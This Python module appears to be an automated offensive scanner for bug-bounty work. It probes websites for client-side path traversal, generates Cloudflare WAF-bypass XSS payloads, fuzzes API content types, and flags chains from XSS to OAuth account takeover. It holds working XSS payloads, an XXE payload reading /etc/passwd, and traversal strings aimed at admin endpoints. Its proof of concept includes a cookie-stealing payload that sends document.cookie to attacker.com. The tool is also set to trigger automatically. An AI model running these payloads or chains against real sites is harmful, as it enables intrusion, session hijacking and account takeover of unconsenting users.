"""
CSPT + Cloudflare WAF Bypass + Multi-ContentType Fuzzing
Skill #56 — CSPTWafBypass

Research basis:
  Intigriti Bug Bytes #235 (April 2026)
  https://www.intigriti.com/researchers/blog/bug-bytes/intigriti-bug-bytes-235-april-2026

  Combined intelligence from:

  1. CSPT (Client-Side Path Traversal) — @xssdoctor
     "CSPT is quietly baked into almost every major frontend framework"
     React, Angular, Vue, Next.js default behaviors hand you ../ for free
     Published: CTBB Labs (April 2026)

  2. Cloudflare WAF bypass → full ATO — @YourFinalSin
     oncontentvisibilityautostatechange event handler slips past Cloudflare filter
     Chain: Cloudflare bypass → XSS → OAuth code theft → full account takeover

  3. Fuzzing with multiple content types — Intigriti resources
     Some APIs/endpoints only respond to specific Content-Type headers
     Systematic multi-Content-Type fuzzing reveals hidden behaviors

  4. Cookie injection → DOM XSS — @RenwaX23
     Same-site DOM XSS triggered through cookie injection (underappreciated XSS sink)

  5. Auxclick clickjacking variant
     Middle mouse button (auxclick) sidesteps classic X-Frame-Options defenses

Background:

  CSPT (Client-Side Path Traversal):
    Unlike server-side path traversal, CSPT occurs when client-side JavaScript
    constructs API/resource paths using user-controllable input without validation.
    Modern frameworks (React Router, Angular Router, Vue Router, Next.js) handle
    routing in ways that can pass ../ sequences to backend API calls.

    Attack chain example:
      URL: /app/user/profile/../../../admin/users
      JS:  fetch('/api' + location.pathname + '/data')
      → fetch('/api/app/user/profile/../../../admin/users/data')
      → fetch('/api/admin/users/data')  ← unauthorized access

  Cloudflare WAF Bypass via oncontentvisibilityautostatechange:
    Cloudflare's WAF filters common event handlers (onclick, onload, onerror, etc.)
    The CSS Containment API's oncontentvisibilityautostatechange event handler was
    not included in WAF rules as of April 2026, allowing XSS injection:

    <div oncontentvisibilityautostatechange=PAYLOAD style=content-visibility:auto>

    This enables:
    - WAF bypass for reflected/stored XSS
    - Cookie theft → session hijacking
    - CSRF token exfiltration
    - Full account takeover chain

  Multi-Content-Type Fuzzing:
    Many APIs behave differently based on Content-Type:
    - REST endpoint may reject JSON but accept XML → XXE vector
    - GraphQL endpoint may accept multipart → file upload RCE
    - Rate limiting may differ per Content-Type
    - WAF rules may be Content-Type specific

bingo integration scope:
  A. CSPT detection in JS bundles and SPA routing
  B. Cloudflare WAF fingerprint + bypass payload generation
  C. Multi-Content-Type endpoint fuzzing
  D. Cookie injection XSS sink detection
  E. Auxclick clickjacking detection
  F. Combined XSS → OAuth chain detection

AI auto-trigger conditions:
  - JS-heavy frontend detected (React/Angular/Vue/Next.js)
  - Cloudflare header detected (cf-ray, cf-cache-status)
  - API endpoints with Content-Type restrictions found
  - OAuth/SSO flows detected
  - XSS payloads blocked by WAF
  - Always runs on SPA targets
"""
from __future__ import annotations

import re
import json
import time
from dataclasses import dataclass, field
from typing import Optional, List, Tuple
from urllib.parse import urljoin, urlparse, quote

import requests
from requests.exceptions import RequestException


# ── CSPT patterns in JS source ────────────────────────────────────────────────

CSPT_JS_PATTERNS = [
    # fetch/axios with pathname/location
    ("fetch_location",   re.compile(r'fetch\s*\(\s*["\']?[^\'"]*["\']?\s*\+\s*(location\.pathname|location\.hash|location\.href|window\.location)', re.I)),
    ("axios_location",   re.compile(r'axios\.\w+\s*\(\s*["\']?[^\'"]*["\']?\s*\+\s*(location\.pathname|location\.hash)', re.I)),
    # Router params used in API calls
    ("router_param_api", re.compile(r'(?:useParams|this\.route\.params|this\.\$route\.params|activatedRoute\.params)\s*[\s\S]{0,200}fetch|axios|http\.get', re.I)),
    # URL constructed from user input
    ("dynamic_api_path", re.compile(r'(?:baseURL|apiUrl|endpoint)\s*\+\s*(?:id|path|slug|params|segment)', re.I)),
    # Template literal with location
    ("`url_template`",   re.compile(r'`[^`]*\$\{(?:location\.pathname|location\.hash|params\.\w+|props\.\w+)[^}]*\}[^`]*`', re.I)),
    # Next.js router.query in API
    ("nextjs_query",     re.compile(r'router\.query\.\w+[\s\S]{0,100}fetch|axios', re.I)),
    # Angular HttpClient with route params
    ("angular_http",     re.compile(r'this\.http\.(?:get|post|put)\s*\([^)]*this\.route\.snapshot', re.I)),
    # Vue $route in axios
    ("vue_route_axios",  re.compile(r'this\.\$route\.(?:params|query)[\s\S]{0,100}axios', re.I)),
]

# ── CSPT test paths ───────────────────────────────────────────────────────────

CSPT_TEST_PATHS = [
    # Basic traversal
    "/../",
    "/../../",
    "/%2f..%2f",
    "/%2f..%2f..%2f",
    # URL encoded variations
    "/..%2f",
    "/..%2F",
    "/%2e%2e/",
    "/%2e%2e%2f",
    # Double encoded
    "/%252e%252e/",
    "/%252f..%252f",
    # Unicode variations
    "/\u002e\u002e/",
    # Null byte
    "/../%00",
    # Target paths after traversal
    "/../admin",
    "/../api/admin",
    "/../api/users",
    "/../api/config",
    "/../etc/passwd",
]

# ── Cloudflare WAF detection ──────────────────────────────────────────────────

CF_HEADERS = ["cf-ray", "cf-cache-status", "cf-request-id", "server"]
CF_SERVER_VALUES = ["cloudflare"]

# ── Cloudflare WAF bypass payloads (2026) ────────────────────────────────────

CF_BYPASS_PAYLOADS = [
    # CSS Containment API — oncontentvisibilityautostatechange (Bug Bytes #235)
    {
        "name": "oncontentvisibilityautostatechange",
        "payload": '<div oncontentvisibilityautostatechange=alert(document.domain) style=content-visibility:auto>',
        "encoded": '<div oncontentvisibilityautostatechange=alert(document.domain) style%3Dcontent-visibility%3Aauto>',
        "description": "CSS Containment API event handler — bypasses Cloudflare WAF filter (April 2026)",
        "cve": "N/A",
        "discovered_by": "@YourFinalSin",
    },
    # Animation events
    {
        "name": "onanimationstart",
        "payload": '<div onanimationstart=alert(1) style=animation-name:x>',
        "encoded": '<div onanimationstart%3Dalert(1) style%3Danimation-name%3Ax>',
        "description": "CSS Animation event handler — may bypass certain WAF rules",
        "cve": "N/A",
        "discovered_by": "community",
    },
    # Transition events
    {
        "name": "ontransitionend",
        "payload": '<div ontransitionend=alert(1) style=transition:all .1s>',
        "encoded": '<div ontransitionend%3Dalert(1) style%3Dtransition%3Aall+.1s>',
        "description": "CSS Transition event handler",
        "cve": "N/A",
        "discovered_by": "community",
    },
    # Drag events
    {
        "name": "ondragstart",
        "payload": '<img src=x ondragstart=alert(1)>',
        "encoded": '<img src%3Dx ondragstart%3Dalert(1)>',
        "description": "Drag event handler",
        "cve": "N/A",
        "discovered_by": "community",
    },
    # Pointer events
    {
        "name": "onpointerdown",
        "payload": '<div onpointerdown=alert(1)>click',
        "encoded": '<div onpointerdown%3Dalert(1)>click',
        "description": "Pointer API event handler",
        "cve": "N/A",
        "discovered_by": "community",
    },
    # auxclick (middle mouse)
    {
        "name": "onauxclick",
        "payload": '<a href=x onauxclick=alert(1)>middle-click me</a>',
        "encoded": '<a href%3Dx onauxclick%3Dalert(1)>middle-click+me</a>',
        "description": "Auxclick (middle mouse button) — bypasses clickjacking defenses (Bug Bytes #235)",
        "cve": "N/A",
        "discovered_by": "community",
    },
    # mXSS via innerHTML
    {
        "name": "mxss_template",
        "payload": '<!--><img src=x onerror=alert(1)>',
        "encoded": '%3C!--%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E',
        "description": "Mutation XSS via innerHTML template parsing",
        "cve": "N/A",
        "discovered_by": "community",
    },
]

# ── Multi-Content-Type payloads ───────────────────────────────────────────────

CONTENT_TYPE_PAYLOADS = [
    ("application/json",                 '{"test": "value"}'),
    ("application/xml",                  '<?xml version="1.0"?><test>value</test>'),
    ("text/xml",                         '<?xml version="1.0"?><test>value</test>'),
    ("application/x-www-form-urlencoded","test=value"),
    ("multipart/form-data",              None),  # handled specially
    ("text/plain",                       "test=value"),
    ("application/cbor",                 None),  # binary, skip body
    ("application/msgpack",              None),
    ("application/vnd.api+json",         '{"data": {"type": "test", "attributes": {"key": "value"}}}'),
    ("application/graphql",              '{ __typename }'),
    ("application/x-ndjson",            '{"test": "value"}\n'),
    ("text/csv",                         "key,value\ntest,data"),
    ("application/x-yaml",              "test: value"),
    ("application/octet-stream",         None),
]

# ── Cookie injection XSS test ─────────────────────────────────────────────────

COOKIE_INJECTION_TESTS = [
    # Test if Set-Cookie header reflects in DOM
    "'; Path=/; HttpOnly=false; SameSite=None",
    # Cookie value XSS
    "<script>alert(1)</script>",
    # Cookie clobbering
    "__Host-test=value",
    # CSP bypass via cookie
    "CSP=default-src *",
]

# ── SPA framework detection ───────────────────────────────────────────────────

SPA_HEADERS = {
    "react":   ["x-react", "x-powered-by: next"],
    "angular": ["x-angular", "x-powered-by: angular"],
    "vue":     ["x-vue"],
}
SPA_BODY_PATTERNS = {
    "react":    re.compile(r'(?:react(?:dom)?(?:\.development|\.production|\.min)?\.js|__NEXT_DATA__|_reactRootContainer)', re.I),
    "angular":  re.compile(r'(?:angular(?:\.min)?\.js|ng-version=|@angular/core)', re.I),
    "vue":      re.compile(r'(?:vue(?:\.min)?\.js|__vue__|v-app|nuxt\.js)', re.I),
    "next":     re.compile(r'(?:__NEXT_DATA__|_next/static|next/router)', re.I),
    "svelte":   re.compile(r'(?:__svelte|svelte-kit)', re.I),
}
OAUTH_PATTERNS = re.compile(
    r'(?:oauth|authorize|auth/callback|connect/|sso|openid|client_id=|scope=openid)',
    re.I
)


# ── Dataclasses ───────────────────────────────────────────────────────────────

@dataclass
class CSPTFinding:
    finding_type: str   # "cspt" | "cf_bypass" | "content_type" | "cookie_xss"
                        # | "auxclick" | "oauth_chain"
    description: str
    url: str = ""
    payload: str = ""
    framework: str = ""
    http_method: str = "GET"
    evidence_level: str = "AI_ANALYSIS"
    severity: str = "medium"
    curl_poc: str = ""
    xss_chain: str = ""   # full XSS→ATO chain if applicable


@dataclass
class CSPTWafResult:
    target: str
    cloudflare_detected: bool = False
    spa_framework: str = ""          # "react" | "angular" | "vue" | "next" | ""
    cspt_patterns_found: list = field(default_factory=list)
    cspt_endpoints: list = field(default_factory=list)
    cf_bypass_payloads: list = field(default_factory=list)
    content_type_findings: list = field(default_factory=list)
    oauth_flows: list = field(default_factory=list)
    findings: list = field(default_factory=list)
    severity: str = "none"
    evidence_level: str = "AI_ANALYSIS"
    error: str = ""
    summary: str = ""


# ── Scanner ───────────────────────────────────────────────────────────────────

class CSPTWafBypassScanner:
    """
    Client-Side Path Traversal + Cloudflare WAF Bypass + Multi-ContentType Fuzzer.

    Covers Bug Bytes #235 (April 2026) findings:
    1. CSPT across React/Angular/Vue/Next.js (xssdoctor)
    2. Cloudflare WAF bypass via oncontentvisibilityautostatechange (@YourFinalSin)
    3. Multi-Content-Type endpoint fuzzing (Intigriti resource)
    4. Cookie injection → DOM XSS (@RenwaX23)
    5. Auxclick clickjacking variant
    6. OAuth chain detection for XSS→ATO escalation
    """

    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    TIMEOUT = 8

    def __init__(self, target: str, proxies: Optional[dict] = None):
        self.target = target.rstrip("/")
        self.proxies = proxies or {}
        self.session = requests.Session()
        self.session.headers.update(self.HEADERS)
        self.session.verify = False

    # ── Public entry ──────────────────────────────────────────────────────────

    def scan(self) -> CSPTWafResult:
        result = CSPTWafResult(target=self.target)
        try:
            base_resp = self._get(self.target)
            if not base_resp:
                result.error = "Target unreachable"
                return result

            # 1. Framework + Cloudflare detection
            self._detect_environment(result, base_resp)

            # 2. JS bundle CSPT pattern analysis
            self._scan_js_for_cspt(result, base_resp)

            # 3. Cloudflare WAF bypass payloads
            if result.cloudflare_detected:
                self._build_cf_bypass_payloads(result)

            # 4. Multi-Content-Type fuzzing on API endpoints
            self._fuzz_content_types(result, base_resp)

            # 5. CSPT endpoint testing
            if result.cspt_patterns_found or result.spa_framework:
                self._test_cspt_endpoints(result, base_resp)

            # 6. OAuth flow detection for XSS→ATO chain
            self._detect_oauth_flows(result, base_resp)

            # 7. Cookie injection XSS sink check
            self._check_cookie_injection(result, base_resp)

            # 8. Auxclick clickjacking check
            self._check_auxclick_clickjacking(result, base_resp)

            self._compute_severity(result)
            self._build_summary(result)

        except Exception as exc:
            result.error = str(exc)
        return result

    # ── Environment detection ─────────────────────────────────────────────────

    def _detect_environment(self, result: CSPTWafResult, resp) -> None:
        # Cloudflare detection
        headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
        if any(h in headers_lower for h in CF_HEADERS[:3]):
            result.cloudflare_detected = True
        if headers_lower.get("server", "").lower() in CF_SERVER_VALUES:
            result.cloudflare_detected = True

        # SPA framework detection
        body = resp.text[:100_000]
        for fw, pattern in SPA_BODY_PATTERNS.items():
            if pattern.search(body):
                result.spa_framework = fw
                break

        # Also check JS bundle URLs for framework hints
        js_links = re.findall(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body, re.I)
        for js_url in js_links[:5]:
            for fw, pattern in SPA_BODY_PATTERNS.items():
                if pattern.search(js_url):
                    if not result.spa_framework:
                        result.spa_framework = fw
                    break

    # ── CSPT JS pattern scanning ──────────────────────────────────────────────

    def _scan_js_for_cspt(self, result: CSPTWafResult, base_resp) -> None:
        # Collect JS bundle URLs
        body = base_resp.text
        js_urls = set()
        for m in re.finditer(r'src=["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', body, re.I):
            href = m.group(1)
            if href.startswith("http"):
                js_urls.add(href)
            elif href.startswith("/"):
                js_urls.add(self.target + href)
            else:
                js_urls.add(self.target + "/" + href)

        # Common SPA bundle paths
        for path in [
            "/static/js/main.js", "/assets/index.js", "/dist/bundle.js",
            "/js/app.js", "/_next/static/chunks/main.js", "/app.js",
        ]:
            js_urls.add(self.target + path)

        scanned = 0
        for url in list(js_urls)[:10]:
            if scanned >= 10:
                break
            resp = self._get(url)
            if not resp or resp.status_code != 200:
                continue
            content_type = resp.headers.get("Content-Type", "").lower()
            if "javascript" not in content_type and "text" not in content_type:
                continue

            js_text = resp.text[:150_000]
            for key, pattern in CSPT_JS_PATTERNS:
                m = pattern.search(js_text)
                if not m:
                    continue
                context = js_text[max(0, m.start()-50):m.end()+100].strip()
                finding = {
                    "pattern": key,
                    "context": context[:200],
                    "source": url,
                    "evidence": m.group(0)[:100],
                }
                result.cspt_patterns_found.append(finding)
                result.findings.append(CSPTFinding(
                    finding_type="cspt",
                    description=(
                        f"CSPT pattern '{key}' detected in {url} — "
                        f"user-controlled path in API/fetch call: {context[:80]}"
                    ),
                    url=url,
                    framework=result.spa_framework,
                    evidence_level="LIKELY",
                    severity="high",
                    curl_poc=self._build_cspt_curl(result.spa_framework),
                    xss_chain=(
                        "CSPT → path traversal to unauthorized API endpoint → "
                        "data exfiltration / IDOR / admin access"
                    ),
                ))
            scanned += 1

    # ── Cloudflare bypass payload generation ──────────────────────────────────

    def _build_cf_bypass_payloads(self, result: CSPTWafResult) -> None:
        result.cf_bypass_payloads = CF_BYPASS_PAYLOADS

        # Add high-priority finding for the oncontentvisibilityautostatechange bypass
        main_bypass = CF_BYPASS_PAYLOADS[0]
        result.findings.append(CSPTFinding(
            finding_type="cf_bypass",
            description=(
                "Cloudflare WAF detected — oncontentvisibilityautostatechange XSS bypass available. "
                "Discovered by @YourFinalSin (Bug Bytes #235 April 2026). "
                "Chain: CF bypass → XSS → OAuth code theft → full ATO"
            ),
            url=self.target,
            payload=main_bypass["payload"],
            evidence_level="LIKELY",
            severity="high",
            curl_poc=(
                f'# Test Cloudflare WAF bypass payload on reflected XSS point:\n'
                f'curl -sk "{self.target}/?q='
                + quote('<div oncontentvisibilityautostatechange=alert(document.domain) style=content-visibility:auto>')
                + '"'
            ),
            xss_chain=(
                "1. Inject: <div oncontentvisibilityautostatechange=PAYLOAD style=content-visibility:auto>\n"
                "2. CF WAF bypassed → XSS executes\n"
                "3. Steal OAuth authorization code via fetch to attacker server\n"
                "4. Exchange code for access token → Full Account Takeover"
            ),
        ))

    # ── Multi-Content-Type fuzzing ────────────────────────────────────────────

    def _fuzz_content_types(self, result: CSPTWafResult, base_resp) -> None:
        # Find API endpoints from JS/HTML
        body = base_resp.text
        api_endpoints = set()

        for m in re.finditer(
            r'''(?:fetch|axios\.(?:get|post|put|patch)|http\.(?:get|post))\s*\(['\"`]([^'"\`<>]+)['\"`]''',
            body, re.I
        ):
            href = m.group(1)
            if href.startswith("/api") or "/api/" in href:
                if href.startswith("http"):
                    api_endpoints.add(href)
                else:
                    api_endpoints.add(self.target + href.split("?")[0])

        # Also test common API paths
        for path in ["/api", "/api/v1", "/api/v2", "/graphql", "/rest", "/ajax"]:
            api_endpoints.add(self.target + path)

        tested = 0
        for endpoint in list(api_endpoints)[:8]:
            if tested >= 8:
                break
            # First get the baseline response
            baseline = self._post(endpoint, "application/json", '{"test":"x"}')
            if not baseline:
                continue

            for ct, body_data in CONTENT_TYPE_PAYLOADS[:8]:
                if body_data is None:
                    continue
                resp = self._post(endpoint, ct, body_data)
                if not resp:
                    continue

                # Interesting: different status code from baseline, or 200 with different CT
                if (resp.status_code != baseline.status_code and
                        resp.status_code in (200, 201, 400, 422, 500)):
                    result.content_type_findings.append({
                        "url": endpoint,
                        "content_type": ct,
                        "baseline_status": baseline.status_code,
                        "new_status": resp.status_code,
                    })
                    if ct in ("application/xml", "text/xml") and resp.status_code != 415:
                        # XML accepted → potential XXE
                        result.findings.append(CSPTFinding(
                            finding_type="content_type",
                            description=(
                                f"XML Content-Type accepted at {endpoint} "
                                f"(status:{resp.status_code}) — potential XXE vector. "
                                f"Baseline JSON returned {baseline.status_code}."
                            ),
                            url=endpoint,
                            payload=ct,
                            http_method="POST",
                            evidence_level="LIKELY",
                            severity="high",
                            curl_poc=(
                                f'curl -sk -X POST "{endpoint}" '
                                f'-H "Content-Type: text/xml" '
                                f'-d \'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>\''
                            ),
                        ))
                    elif ct == "application/x-www-form-urlencoded" and resp.status_code == 200:
                        result.findings.append(CSPTFinding(
                            finding_type="content_type",
                            description=(
                                f"Form-urlencoded accepted at {endpoint} — "
                                f"may bypass JSON-specific WAF rules or validation"
                            ),
                            url=endpoint,
                            payload=ct,
                            http_method="POST",
                            evidence_level="INFERRED",
                            severity="medium",
                            curl_poc=(
                                f'curl -sk -X POST "{endpoint}" '
                                f'-H "Content-Type: application/x-www-form-urlencoded" '
                                f'-d "key=value&test=payload"'
                            ),
                        ))
            tested += 1

    # ── CSPT endpoint testing ─────────────────────────────────────────────────

    def _test_cspt_endpoints(self, result: CSPTWafResult, base_resp) -> None:
        # Find SPA route patterns from the base page
        body = base_resp.text
        route_patterns = re.findall(r'(?:path|route):\s*["\']([/\w:*-]+)["\']', body, re.I)

        # Add common SPA routes
        test_routes = [
            "/app", "/dashboard", "/profile", "/user", "/account", "/settings",
        ] + [r for r in route_patterns if r.startswith("/")][:5]

        for route in test_routes[:6]:
            for traversal in CSPT_TEST_PATHS[:8]:
                test_url = self.target + route + traversal
                resp = self._get(test_url)
                if not resp:
                    continue

                # 200 on traversal path = likely CSPT
                if resp.status_code == 200 and len(resp.text) > 100:
                    # Check if response is different from traversal to root
                    root_resp = self._get(self.target + traversal.replace("../", "").replace("..", ""))
                    if root_resp and abs(len(resp.text) - len(root_resp.text)) < 500:
                        continue  # Same as root, not interesting

                    result.cspt_endpoints.append({
                        "url": test_url,
                        "traversal": traversal,
                        "status": resp.status_code,
                        "size": len(resp.text),
                    })
                    result.findings.append(CSPTFinding(
                        finding_type="cspt",
                        description=(
                            f"CSPT path traversal returned 200 at {test_url} "
                            f"(size:{len(resp.text)}) — "
                            f"framework may be resolving ../ in SPA routing"
                        ),
                        url=test_url,
                        payload=traversal,
                        framework=result.spa_framework,
                        evidence_level="VERIFIED",
                        severity="high",
                        curl_poc=f'curl -sk "{test_url}"',
                    ))

    # ── OAuth flow detection ──────────────────────────────────────────────────

    def _detect_oauth_flows(self, result: CSPTWafResult, base_resp) -> None:
        body = base_resp.text
        if not OAUTH_PATTERNS.search(body):
            # Also check common OAuth paths
            for path in ["/auth", "/oauth", "/login", "/connect", "/sso"]:
                resp = self._get(self.target + path)
                if resp and resp.status_code in (200, 302):
                    if OAUTH_PATTERNS.search(resp.text) or OAUTH_PATTERNS.search(
                        resp.headers.get("Location", "")
                    ):
                        result.oauth_flows.append(self.target + path)
            if not result.oauth_flows:
                return
        else:
            # Extract OAuth-related URLs
            for m in re.finditer(
                r'(?:href|action|src)=["\']([^"\']*(?:oauth|authorize|auth/callback)[^"\']*)["\']',
                body, re.I
            ):
                result.oauth_flows.append(m.group(1)[:200])

        if result.oauth_flows and result.cloudflare_detected:
            result.findings.append(CSPTFinding(
                finding_type="oauth_chain",
                description=(
                    f"OAuth flow + Cloudflare WAF detected — "
                    f"Full ATO chain possible: CF bypass XSS → OAuth code interception → ATO. "
                    f"OAuth endpoint: {result.oauth_flows[0][:100]}"
                ),
                url=result.oauth_flows[0] if result.oauth_flows else self.target,
                payload=CF_BYPASS_PAYLOADS[0]["payload"],
                evidence_level="LIKELY",
                severity="critical",
                curl_poc=(
                    "# ATO chain PoC:\n"
                    "# 1. Find reflected XSS parameter\n"
                    "# 2. Inject oncontentvisibilityautostatechange payload:\n"
                    f'#    {self.target}/?q=<div+oncontentvisibilityautostatechange='
                    "fetch(`https://attacker.com?c=`+document.cookie)"
                    " style=content-visibility:auto>\n"
                    "# 3. Victim clicks link → XSS fires → OAuth code captured\n"
                    "# 4. Exchange code: POST /oauth/token with stolen code"
                ),
                xss_chain=(
                    "Cloudflare WAF bypass (oncontentvisibilityautostatechange) → "
                    "XSS execution → OAuth authorization code theft → "
                    "Token exchange → Full Account Takeover"
                ),
            ))

    # ── Cookie injection check ────────────────────────────────────────────────

    def _check_cookie_injection(self, result: CSPTWafResult, base_resp) -> None:
        # Test if Set-Cookie reflection exists in response headers or body
        # Look for cookie-setting mechanisms that might be injectable
        body = base_resp.text

        # Check for cookie reflection patterns
        cookie_reflection = re.search(
            r'(?:document\.cookie\s*=|setCookie\s*\(|Cookies\.set\s*\()',
            body, re.I
        )
        if not cookie_reflection:
            return

        # Check for DOM sinks that read from cookies
        dom_cookie_sink = re.search(
            r'(?:document\.write|innerHTML|outerHTML|eval)\s*\([^)]*(?:document\.cookie|'
            r'getCookie|Cookies\.get)',
            body, re.I
        )
        if dom_cookie_sink:
            result.findings.append(CSPTFinding(
                finding_type="cookie_xss",
                description=(
                    "Cookie injection → DOM XSS sink detected — "
                    "document.cookie value flows into innerHTML/document.write/eval. "
                    "Same-site DOM XSS may be triggerable via cookie injection (@RenwaX23 Bug Bytes #235)"
                ),
                url=self.target,
                payload="<img src=x onerror=alert(1)>",
                evidence_level="LIKELY",
                severity="high",
                curl_poc=(
                    f'# Set malicious cookie and trigger DOM XSS:\n'
                    f'curl -sk "{self.target}" '
                    f'-H "Cookie: session=<img src=x onerror=alert(document.domain)>" | '
                    f'grep -i "cookie"'
                ),
            ))

    # ── Auxclick clickjacking check ───────────────────────────────────────────

    def _check_auxclick_clickjacking(self, result: CSPTWafResult, base_resp) -> None:
        headers = base_resp.headers

        # Check X-Frame-Options and CSP frame-ancestors
        xfo = headers.get("X-Frame-Options", "")
        csp = headers.get("Content-Security-Policy", "")
        has_frame_protection = bool(xfo) or "frame-ancestors" in csp.lower()

        if has_frame_protection:
            # Still check for auxclick bypass potential
            # Classic XFO/CSP frame-ancestors stops iframing but
            # auxclick requires different context
            result.findings.append(CSPTFinding(
                finding_type="auxclick",
                description=(
                    f"X-Frame-Options/CSP present but auxclick clickjacking variant may apply. "
                    f"Middle-mouse-button (auxclick) event bypasses several classic defenses. "
                    f"XFO: '{xfo}' | CSP frame-ancestors: {'yes' if 'frame-ancestors' in csp.lower() else 'no'}"
                ),
                url=self.target,
                payload='<a href=x onauxclick=alert(1)>middle-click me</a>',
                evidence_level="INFERRED",
                severity="low",
                curl_poc=(
                    f'# Test auxclick variant in browser:\n'
                    f'# <a href="{self.target}" onauxclick="alert(\'auxclick XSS\')" '
                    f'style="display:block;width:200px;height:50px">Middle click here</a>'
                ),
            ))
        else:
            # No frame protection at all → classic clickjacking + auxclick
            result.findings.append(CSPTFinding(
                finding_type="auxclick",
                description=(
                    "No X-Frame-Options or CSP frame-ancestors detected — "
                    "classic clickjacking AND auxclick variant both applicable. "
                    "Auxclick (middle mouse button) bypasses additional defenses (Bug Bytes #235)"
                ),
                url=self.target,
                payload='<a href=x onauxclick=PAYLOAD>middle-click me</a>',
                evidence_level="VERIFIED",
                severity="medium",
                curl_poc=(
                    f'curl -sk -I "{self.target}" | grep -iE "x-frame|content-security"'
                    f"\n# No frame protection detected"
                ),
            ))

    # ── CSPT curl PoC builder ─────────────────────────────────────────────────

    def _build_cspt_curl(self, framework: str) -> str:
        base = self.target
        if framework == "next":
            return (
                f'# Next.js CSPT test:\n'
                f'curl -sk "{base}/app/user/profile/..%2f..%2fadmin" | head -c 500\n'
                f'curl -sk "{base}/api/user/1/..%2f..%2fadmin/users" | head -c 500'
            )
        elif framework == "react":
            return (
                f'# React Router CSPT test:\n'
                f'curl -sk "{base}/dashboard/..%2f..%2fadmin" | head -c 500\n'
                f'# Also test API fetch path:\n'
                f'curl -sk "{base}/api/data?path=../../admin/config" | head -c 500'
            )
        elif framework in ("vue", "angular"):
            return (
                f'# {framework.title()} Router CSPT test:\n'
                f'curl -sk "{base}/profile/..%2f..%2fadmin" | head -c 500'
            )
        else:
            return (
                f'# Generic CSPT test:\n'
                f'curl -sk "{base}/app/../admin" | head -c 500\n'
                f'curl -sk "{base}/api/v1/../v2/admin" | head -c 500'
            )

    # ── Helpers ───────────────────────────────────────────────────────────────

    def _get(self, url: str):
        try:
            return self.session.get(
                url, timeout=self.TIMEOUT, proxies=self.proxies, allow_redirects=True
            )
        except RequestException:
            return None

    def _post(self, url: str, content_type: str, body: str):
        try:
            return self.session.post(
                url,
                data=body.encode() if body else b"",
                headers={"Content-Type": content_type},
                timeout=self.TIMEOUT,
                proxies=self.proxies,
                allow_redirects=False,
            )
        except RequestException:
            return None

    def _compute_severity(self, result: CSPTWafResult) -> None:
        ev_set = {f.evidence_level for f in result.findings}
        sev_set = {f.severity for f in result.findings}

        if "critical" in sev_set and "VERIFIED" in ev_set:
            result.severity = "critical"
            result.evidence_level = "VERIFIED"
        elif "critical" in sev_set or ("high" in sev_set and "VERIFIED" in ev_set):
            result.severity = "high"
            result.evidence_level = "VERIFIED" if "VERIFIED" in ev_set else "LIKELY"
        elif "high" in sev_set:
            result.severity = "medium"
            result.evidence_level = "LIKELY" if "LIKELY" in ev_set else "INFERRED"
        elif result.findings:
            result.severity = "low"
            result.evidence_level = "INFERRED"
        else:
            result.severity = "none"

    def _build_summary(self, result: CSPTWafResult) -> None:
        result.summary = (
            f"CSPTWafBypass: {len(result.findings)}건 | "
            f"CF_WAF:{result.cloudflare_detected} | "
            f"SPA:{result.spa_framework or 'none'} | "
            f"CSPT패턴:{len(result.cspt_patterns_found)} | "
            f"CSPT엔드포인트:{len(result.cspt_endpoints)} | "
            f"CF우회페이로드:{len(result.cf_bypass_payloads)} | "
            f"ContentType:{len(result.content_type_findings)} | "
            f"OAuth:{len(result.oauth_flows)} | "
            f"심각도:{result.severity}"
        )
